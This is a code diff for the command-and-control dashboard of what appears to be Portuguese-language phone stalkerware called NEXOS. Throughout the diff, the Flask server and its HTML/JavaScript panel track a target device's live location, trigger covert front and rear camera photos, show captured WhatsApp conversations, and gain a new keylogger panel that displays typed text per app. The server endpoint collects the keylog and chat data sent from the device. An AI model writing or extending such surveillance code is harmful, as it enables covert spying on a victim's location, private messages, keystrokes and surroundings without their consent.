@@ -14,7 +14,7 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>NEXOS // PAINEL</title>
+    <title>NEXOS // PAINEL DE MONITORAMENTO</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
@@ -22,7 +22,7 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         body { background: #0a0a0a; color: #e2e8f0; font-family: 'Courier New', monospace; padding: 15px; }
         .wrapper { max-width: 900px; margin: 0 auto; }
         .header { text-align: center; margin-bottom: 20px; padding: 10px; border-bottom: 2px solid #1e293b; }
-        .header h1 { font-size: 20px; color: #38bdf8; letter-spacing: 3px; }
+        .header h1 { font-size: 20px; color: #38bdf8; letter-spacing: 3px; font-weight: bold; }
         .search-box { background: #111; border: 1px solid #1e293b; padding: 20px; border-radius: 12px; text-align: center; margin-bottom: 20px; }
         .search-box input { width: 100%; max-width: 300px; background: #0a0a0a; border: 1px solid #1e293b; padding: 12px; color: #34d399; font-weight: bold; text-align: center; border-radius: 6px; font-size: 16px; margin-bottom: 15px; letter-spacing: 2px; }
         .search-box button { background: #38bdf8; color: #0a0a0a; font-weight: bold; border: none; padding: 12px 30px; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 13px; }
@@ -50,7 +50,7 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .whatsapp-section { margin-bottom: 15px; }
         .whatsapp-section h3 { color: #25d366; font-size: 13px; margin-bottom: 8px; text-transform: uppercase; }
         .chat-list { display: flex; flex-direction: column; gap: 6px; }
-        .chat-card { background: #0a0a0a; border: 1px solid #1e293b; border-radius: 8px; overflow: hidden; cursor: pointer; }
+        .chat-card { background: #0a0a0a; border: 1px solid #1e293b; border-radius: 8px; overflow: hidden; cursor: pointer; transition: all 0.2s; }
         .chat-card:hover { border-color: #25d366; }
         .chat-card-header { display: flex; justify-content: space-between; align-items: center; padding: 10px 12px; }
         .chat-card-header .pessoa { color: #25d366; font-weight: bold; font-size: 12px; }
@@ -59,8 +59,17 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .chat-card-header .ultima { color: #64748b; font-size: 10px; max-width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
         .chat-card-body { display: none; padding: 0 12px 10px 12px; max-height: 250px; overflow-y: auto; }
         .chat-card.aberto .chat-card-body { display: block; }
-        .chat-msg { padding: 6px 0; border-bottom: 1px solid #1e293b; font-size: 11px; color: #94a3b8; }
+        .chat-msg { padding: 6px 0; border-bottom: 1px solid #1e293b; font-size: 11px; }
+        .chat-msg.recebida { color: #94a3b8; }
+        .chat-msg.enviada { color: #38bdf8; text-align: right; }
+        .chat-msg.midia { color: #f59e0b; }
         .chat-msg .hora { color: #64748b; font-size: 9px; }
+        .chat-msg .tipo-tag { font-size: 8px; text-transform: uppercase; }
+        
+        .keylog-box { background: #0a0a0a; border: 2px solid #ef4444; padding: 10px; border-radius: 8px; margin-bottom: 15px; }
+        .keylog-box.ativo { border-color: #22c55e; animation: pulse 1s infinite; }
+        .keylog-box .app-nome { color: #f59e0b; font-weight: bold; text-transform: uppercase; }
+        .keylog-box .keylog-texto { color: #38bdf8; font-size: 12px; margin-top: 5px; word-break: break-all; }
         
         .error-box { background: #450a0a; border: 1px solid #991b1b; padding: 15px; border-radius: 8px; text-align: center; margin-bottom: 20px; }
         .error-box p { color: #fca5a5; font-weight: bold; }
@@ -71,107 +80,156 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
 </head>
 <body>
     <div class="wrapper">
-        <div class="header"><h1>NEXOS // PAINEL</h1></div>
+        <div class="header"><h1>NEXOS // PAINEL DE MONITORAMENTO</h1></div>
         <div class="search-box">
-            <p>DIGITE SEU ID PARA RASTREAR</p>
-            <form method="POST">
-                <input type="text" name="target_id" placeholder="EX: NX-A4B7D1" value="{{ id_buscado if id_buscado else '' }}" required><br>
-                <button type="submit">Conectar</button>
+            <p>DIGITE O SEU TARGET ID PARA ACESSAR O MONITORAMENTO</p>
+            <form id="searchForm" method="POST">
+                <input type="text" id="target_id" name="target_id" placeholder="EX: NX-A4B7D1" value="{{ id_buscado if id_buscado else '' }}" required><br>
+                <button type="submit">Conectar Sinal</button>
             </form>
         </div>
         {% if erro %}<div class="error-box"><p>⚠️ {{ erro }}</p></div>{% endif %}
         {% if info_moto %}
             <div class="device-section">
                 <div class="device-title">
-                    <span><span class="status-dot status-online"></span> {{ id_buscado }}</span>
+                    <span><span class="status-dot status-online"></span> CONEXAO ATIVA // {{ id_buscado }}</span>
                     <span style="background: #166534; color: #4ade80; padding: 4px 10px; border-radius: 4px; font-size: 11px;">ONLINE</span>
                 </div>
                 <div class="info-grid">
                     <div class="info-box"><span>🔋 Bateria</span><strong id="txt_bateria" style="color: #22c55e;">{{ info_moto.battery }}%</strong></div>
-                    <div class="info-box"><span>⏱️ Ativo</span><strong id="txt_uptime">{{ info_moto.get('uptime', '--') }}</strong></div>
+                    <div class="info-box"><span>⏱️ Tempo Ativo</span><strong id="txt_uptime">{{ info_moto.get('uptime', '--') }}</strong></div>
                     <div class="info-box"><span>📶 Rede</span><strong id="txt_network">{{ info_moto.get('network', '--') }}</strong></div>
                 </div>
                 <div id="map_private" class="map-container"></div>
                 <div class="btn-row">
                     <a id="lnk_maps" href="https://www.google.com/maps?q={{ info_moto.lat }},{{ info_moto.lon }}" target="_blank" class="btn-maps">🗺️ Maps</a>
-                    <button class="btn-cmd" onclick="comando('vibrar')">📳</button>
-                    <button class="btn-cmd" onclick="comando('som')">🔊</button>
-                    <button class="btn-cmd" onclick="comando('lanterna')">💡</button>
+                    <button class="btn-cmd" onclick="enviarComando('vibrar')">📳</button>
+                    <button class="btn-cmd" onclick="enviarComando('som')">🔊</button>
+                    <button class="btn-cmd" onclick="enviarComando('lanterna')">💡</button>
                 </div>
-                <button id="btnCam" class="btn-camera" onclick="capturar()">📸 Capturar</button>
+                <button id="btnCam" class="btn-camera" onclick="dispararCapturaDupla()">📸 Captura Sincronizada</button>
+                
+                <div id="keylogBox" class="keylog-box">
+                    <p>⌨️ Nenhum app monitorado aberto</p>
+                </div>
                 
                 <div class="whatsapp-section">
                     <h3>💬 WhatsApp</h3>
-                    <div id="chatList" class="chat-list"><p style="color:#64748b;font-size:11px;">Nenhuma conversa</p></div>
+                    <div id="chatList" class="chat-list">
+                        <p style="color:#64748b;font-size:11px;">Nenhuma conversa recente</p>
+                    </div>
                 </div>
                 
                 <div class="cameras-row">
-                    <div class="cam-card"><div class="cam-card-title">🎥 Frontal</div><div class="cam-frame"><span id="labelFront" class="cam-placeholder">Sem Sinal</span><img id="imgFront" src="" alt="Frontal"></div></div>
-                    <div class="cam-card"><div class="cam-card-title">🎥 Traseira</div><div class="cam-frame"><span id="labelBack" class="cam-placeholder">Sem Sinal</span><img id="imgBack" src="" alt="Traseira"></div></div>
+                    <div class="cam-card"><div class="cam-card-title">🎥 Câmera Frontal</div><div class="cam-frame"><span id="labelFront" class="cam-placeholder">Sem Sinal</span><img id="imgFront" src="" alt="Frontal"></div></div>
+                    <div class="cam-card"><div class="cam-card-title">🎥 Câmera Traseira</div><div class="cam-frame"><span id="labelBack" class="cam-placeholder">Sem Sinal</span><img id="imgBack" src="" alt="Traseira"></div></div>
                 </div>
             </div>
             <script>
-                var map = L.map('map_private').setView([{{ info_moto.lat }}, {{ info_moto.lon }}], 17);
+                let map = L.map('map_private', { zoomControl: true }).setView([{{ info_moto.lat }}, {{ info_moto.lon }}], 17);
                 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-                var marker = L.marker([{{ info_moto.lat }}, {{ info_moto.lon }}]).addTo(map);
-                var linha = L.polyline([], {color: '#38bdf8'}).addTo(map);
-                var pts = [[{{ info_moto.lat }}, {{ info_moto.lon }}]];
-                var abertos = {};
+                let marker = L.marker([{{ info_moto.lat }}, {{ info_moto.lon }}]).addTo(map);
+                let historico = L.polyline([], {color: '#38bdf8', weight: 3}).addTo(map);
+                let pontos = [[{{ info_moto.lat }}, {{ info_moto.lon }}]];
+                let chatsAbertos = {};
                 
-                function comando(a) {
-                    fetch('/api/comando_remoto/{{ id_buscado }}', {method:'POST',body:JSON.stringify({acao:a}),headers:{'Content-Type':'application/json'}});
-                }
-                
-                function toggle(p, c) {
-                    if(c.classList.contains('aberto')) { c.classList.remove('aberto'); delete abertos[p]; }
-                    else { c.classList.add('aberto'); abertos[p] = true; }
-                }
-                
-                function capturar() {
-                    var b = document.getElementById('btnCam');
-                    b.innerText = "⏳"; b.disabled = true;
-                    fetch('/api/comando_camera/{{ id_buscado }}', {method:'POST',body:JSON.stringify({acao:'take_dual'}),headers:{'Content-Type':'application/json'}});
-                    var t = 0;
-                    var c = setInterval(function() {
-                        fetch('/api/get_camera/{{ id_buscado }}').then(r=>r.json()).then(d=>{
-                            if(d.photo_back) { document.getElementById('labelBack').style.display='none'; document.getElementById('imgBack').src='data:image/jpeg;base64,'+d.photo_back; document.getElementById('imgBack').style.display='block'; }
-                            if(d.photo_front) { document.getElementById('labelFront').style.display='none'; document.getElementById('imgFront').src='data:image/jpeg;base64,'+d.photo_front; document.getElementById('imgFront').style.display='block'; }
-                            if(d.pronto) { clearInterval(c); b.innerText = "📸 Capturar"; b.disabled = false; }
-                        });
-                        t++; if(t>40) { clearInterval(c); b.innerText = "📸 Capturar"; b.disabled = false; }
-                    }, 1500);
-                }
-                
-                function atualizar() {
-                    fetch('/api/status/{{ id_buscado }}').then(r=>r.json()).then(d=>{
-                        document.getElementById('txt_bateria').innerText = d.battery + '%';
-                        document.getElementById('txt_uptime').innerText = d.uptime || '--';
-                        document.getElementById('txt_network').innerText = d.network || '--';
-                        
-                        var lat = parseFloat(d.lat), lon = parseFloat(d.lon);
-                        if(lat && lon && lat !== 0) {
-                            marker.setLatLng([lat, lon]);
-                            map.setView([lat, lon], map.getZoom());
-                            document.getElementById('lnk_maps').href = 'https://www.google.com/maps?q=' + lat + ',' + lon;
-                            pts.push([lat, lon]);
-                            linha.setLatLngs(pts);
-                        }
-                        
-                        if(d.whatsapp && d.whatsapp.length > 0) {
-                            var html = '';
-                            d.whatsapp.forEach(function(chat) {
-                                var ab = abertos[chat.pessoa] ? ' aberto' : '';
-                                html += '<div class="chat-card'+ab+'" onclick="toggle(\''+chat.pessoa+'\',this)"><div class="chat-card-header"><span class="pessoa">👤 '+chat.pessoa+'</span><div class="info"><span class="ultima">'+(chat.midia?'📎 ':'')+(chat.ultima_msg||'')+'</span><span class="total">'+chat.total+'</span></div></div><div class="chat-card-body">';
-                                if(chat.mensagens) chat.mensagens.slice().reverse().forEach(function(m){ html += '<div class="chat-msg">📥 '+m.texto+' <span class="hora">'+m.hora+'</span></div>'; });
-                                html += '</div></div>';
-                            });
-                            document.getElementById('chatList').innerHTML = html;
-                        }
+                function enviarComando(acao) {
+                    fetch('/api/comando_remoto/{{ id_buscado }}', {
+                        method: 'POST', body: JSON.stringify({acao: acao}),
+                        headers: {'Content-Type': 'application/json'}
                     });
                 }
                 
-                atualizar();
-                setInterval(atualizar, 3000);
+                function toggleChat(pessoa, card) {
+                    if (card.classList.contains('aberto')) {
+                        card.classList.remove('aberto');
+                        delete chatsAbertos[pessoa];
+                    } else {
+                        card.classList.add('aberto');
+                        chatsAbertos[pessoa] = true;
+                    }
+                }
+                
+                async function dispararCapturaDupla() {
+                    const btn = document.getElementById('btnCam');
+                    btn.innerText = "⏳ Sincronizando..."; btn.disabled = true;
+                    try {
+                        await fetch('/api/comando_camera/{{ id_buscado }}', { method: 'POST', body: JSON.stringify({acao: 'take_dual'}), headers: {'Content-Type': 'application/json'} });
+                        let t = 0;
+                        let c = setInterval(async () => {
+                            try {
+                                const r = await fetch('/api/get_camera/{{ id_buscado }}');
+                                if (r.ok) {
+                                    const d = await r.json();
+                                    if(d.photo_back) { document.getElementById('labelBack').style.display = "none"; document.getElementById('imgBack').src = "data:image/jpeg;base64," + d.photo_back; document.getElementById('imgBack').style.display = "block"; }
+                                    if(d.photo_front) { document.getElementById('labelFront').style.display = "none"; document.getElementById('imgFront').src = "data:image/jpeg;base64," + d.photo_front; document.getElementById('imgFront').style.display = "block"; }
+                                    if(d.pronto) { clearInterval(c); btn.innerText = "📸 Captura Sincronizada"; btn.disabled = false; }
+                                }
+                                t++; if(t > 40) { clearInterval(c); btn.innerText = "📸 Captura Sincronizada"; btn.disabled = false; }
+                            } catch(e){}
+                        }, 1500);
+                    } catch(e) { btn.innerText = "📸 Captura Sincronizada"; btn.disabled = false; }
+                }
+                
+                setInterval(async () => {
+                    try {
+                        const r = await fetch('/api/status/' + '{{ id_buscado }}');
+                        if (r.ok) {
+                            const d = await r.json();
+                            document.getElementById('txt_bateria').innerText = d.battery + '%';
+                            document.getElementById('txt_uptime').innerText = d.uptime || '--';
+                            document.getElementById('txt_network').innerText = d.network || '--';
+                            
+                            let lat = parseFloat(d.lat), lon = parseFloat(d.lon);
+                            if (lat && lon) {
+                                marker.setLatLng([lat, lon]); map.panTo([lat, lon]);
+                                document.getElementById('lnk_maps').href = 'https://www.google.com/maps?q=' + lat + ',' + lon;
+                                pontos.push([lat, lon]); if(pontos.length > 50) pontos.shift();
+                                historico.setLatLngs(pontos);
+                            }
+                            
+                            // KEYLOGGER
+                            let kb = document.getElementById('keylogBox');
+                            if(d.keylog && d.keylog.ativo) {
+                                kb.className = 'keylog-box ativo';
+                                let textoHtml = d.keylog.texto ? `<div class="keylog-texto">📝 ${d.keylog.texto}</div>` : '';
+                                kb.innerHTML = `<p>⌨️ <span class="app-nome">${d.keylog.app}</span> monitorado${textoHtml}</p>`;
+                            } else if(!d.keylog || !d.keylog.ativo) {
+                                kb.className = 'keylog-box';
+                                kb.innerHTML = '<p>⌨️ Nenhum app monitorado aberto</p>';
+                            }
+                            
+                            // WHATSAPP - Mantém cards abertos
+                            if(d.whatsapp && d.whatsapp.length > 0) {
+                                let html = '';
+                                d.whatsapp.forEach(chat => {
+                                    let temMidia = chat.midia ? '📎 ' : '';
+                                    let aberto = chatsAbertos[chat.pessoa] ? ' aberto' : '';
+                                    html += `<div class="chat-card${aberto}" onclick="toggleChat('${chat.pessoa}', this)">
+                                        <div class="chat-card-header">
+                                            <span class="pessoa">👤 ${chat.pessoa}</span>
+                                            <div class="info">
+                                                <span class="ultima">${temMidia}${chat.ultima_msg || ''}</span>
+                                                <span class="total">${chat.total}</span>
+                                            </div>
+                                        </div>
+                                        <div class="chat-card-body">`;
+                                    
+                                    if(chat.mensagens) {
+                                        chat.mensagens.slice().reverse().forEach(msg => {
+                                            let cls = 'chat-msg ' + (msg.tipo || 'recebida');
+                                            if(msg.midia) cls += ' midia';
+                                            html += `<div class="${cls}"><span class="tipo-tag">${msg.tipo === 'enviada' ? '📤' : '📥'}</span> ${msg.texto} <span class="hora">${msg.hora}</span></div>`;
+                                        });
+                                    }
+                                    
+                                    html += `</div></div>`;
+                                });
+                                document.getElementById('chatList').innerHTML = html;
+                            }
+                        }
+                    } catch(e) {}
+                }, 3000);
             </script>
         {% endif %}
     </div>
@@ -193,7 +251,7 @@ def api_status(device_id):
     device_id = device_id.upper()
     if device_id in db_dispositivos:
         d = db_dispositivos[device_id]
-        return jsonify({"battery": d.get("battery","N/A"), "uptime": d.get("uptime","N/A"), "lat": d.get("lat",0), "lon": d.get("lon",0), "network": d.get("network","N/A"), "whatsapp": d.get("whatsapp",[])}), 200
+        return jsonify({"battery": d.get("battery","N/A"), "uptime": d.get("uptime","N/A"), "lat": d.get("lat",0), "lon": d.get("lon",0), "network": d.get("network","N/A"), "whatsapp": d.get("whatsapp",[]), "keylog": d.get("keylog")}), 200
     return jsonify({"error": "Not found"}), 404
 
 @app.route('/update', methods=['POST'])
@@ -202,7 +260,7 @@ def update():
     device_id = data.get('device_id', '').upper()
     if not device_id: return jsonify({"status": "error"}), 400
     if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
-    db_dispositivos[device_id].update({"battery": data.get("battery","N/A"), "uptime": data.get("uptime","N/A"), "lat": float(data.get("lat",-16.6869)), "lon": float(data.get("lon",-49.2648)), "network": data.get("network","N/A"), "whatsapp": data.get("whatsapp",[]), "last_seen": datetime.utcnow().isoformat()})
+    db_dispositivos[device_id].update({"battery": data.get("battery","N/A"), "uptime": data.get("uptime","N/A"), "lat": float(data.get("lat",-16.6869)), "lon": float(data.get("lon",-49.2648)), "network": data.get("network","N/A"), "whatsapp": data.get("whatsapp",[]), "keylog": data.get("keylog"), "last_seen": datetime.utcnow().isoformat()})
     cmd_cam = db_dispositivos[device_id].get("cmd_cam", "wait")
     cmd_remoto = db_dispositivos[device_id].get("cmd_remoto", "none")
     db_dispositivos[device_id]["cmd_cam"] = "wait"; db_dispositivos[device_id]["cmd_remoto"] = "none"
